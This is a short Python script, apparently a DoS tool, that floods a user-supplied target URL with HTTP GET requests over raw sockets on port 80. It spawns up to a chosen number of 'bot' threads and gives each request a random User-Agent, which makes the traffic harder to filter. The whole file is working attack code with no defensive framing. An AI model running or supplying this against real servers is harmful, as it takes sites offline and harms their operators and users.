__author__ = "NOWL"
__version__ = 0.21

import time, os
from socket import *
from _thread import *
from fake_useragent import UserAgent

target = str(input("Enter Target URL: "))
mbots = int(input("Enter Max Bots: "))
ua = UserAgent()
port = 80
sends = 0
bots = 0

def bot():
    global bots, sends
    bots += 1
    while True:
        req = "GET / HTTP/1.1\r\nHost: "+target+"\r\nConnection: Keep-Alive\r\nUser-Agent: "+ua.random+"\r\n\r\n"
        sock = socket(AF_INET,SOCK_STREAM)
        try:
            sock.connect((target,port))
            sock.send(str.encode(req))
            sends += 1
        except:
            print("Server Not Reachable.")

while True:
    try:
        os.system("cls")
        print("Requests:",sends,"Bots:",bots,"Target:",target,"IP:",gethostbyname(target))
        if bots < mbots:
            start_new_thread(bot,())
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("Exit.")
        exit()
